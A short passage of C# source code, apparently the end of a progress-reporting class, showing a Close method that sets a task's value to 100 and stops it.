                _task.IsIndeterminate = true;
            }
        }

        public void Close()
        {
            _task.Value = 100;
            _task.StopTask();
        }
    }
}
